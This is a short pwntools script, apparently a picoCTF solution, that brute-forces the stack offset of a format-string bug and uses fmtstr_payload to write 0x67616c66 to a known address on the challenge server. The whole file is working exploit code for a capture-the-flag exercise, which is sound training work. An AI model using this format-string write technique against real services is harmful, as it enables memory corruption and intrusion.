# this script is written if you want to brute force the offset 
# and set a target value to a variable whose address is known


from pwn import *

context(os='linux', arch='amd64')
# context.log_level = "debug"

sus_addr = 0x404060
target_value = 0x67616c66

# Loop through a range of offsets to try and find the correct one.
for offset in range(1, 21):
    log.info("Trying offset %d", offset)
    r = remote("rhea.picoctf.net", 58873)
    payload = fmtstr_payload(offset, {sus_addr: target_value})
    log.info("Payload: %s", payload)

    # Send the payload.
    r.sendline(payload)

    try:
        output = r.recvall(timeout=2)
    except EOFError:
        output = b""
    log.info("Output:\n%s", output.decode(errors="replace"))
    
    # Look for clues that the flag was printed. Adjust the search keywords if necessary.
    if b"flag" in output or b"picoCTF" in output or b"I have NO clue" in output:
        log.success("Flag received with offset %d", offset)
        print(output.decode(errors="replace"))
        break
    r.close()
